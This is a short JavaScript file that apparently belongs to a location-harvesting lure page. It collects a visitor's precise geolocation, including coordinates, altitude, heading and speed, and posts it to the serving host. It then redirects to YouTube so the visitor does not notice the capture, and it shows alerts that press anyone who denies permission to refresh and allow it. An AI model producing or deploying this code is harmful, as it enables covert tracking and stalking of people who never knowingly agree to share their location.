function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    var server_data ={
      "Type":'location',
      "Lat":lat,
      "Lon":lon,
      "Acc":acc,
      "Alt":alt,
      "Dir":dir, 
      "Spd":spd,  
  };


    $.ajax({
      type: "POST",
      url: "/",
      data: JSON.stringify(server_data),
      contentType: "application/json",
      dataType: 'json' ,
      success: function(){window.location='https://youtube.com';},
      mimeType: 'text'
      });
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			var timeout = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'An unknown error occurred';
			break;
	}

  var error_data ={
  "Denied": denied,
     "Una": unavailable,
    "Time": timeout,
     "Unk": unknown,
  };



  $.ajax({
    type: 'POST',
    url: '/',
    data: JSON.stringify(error_data),
    contentType:"application/json",
    dataType:'json',
    
  });
}
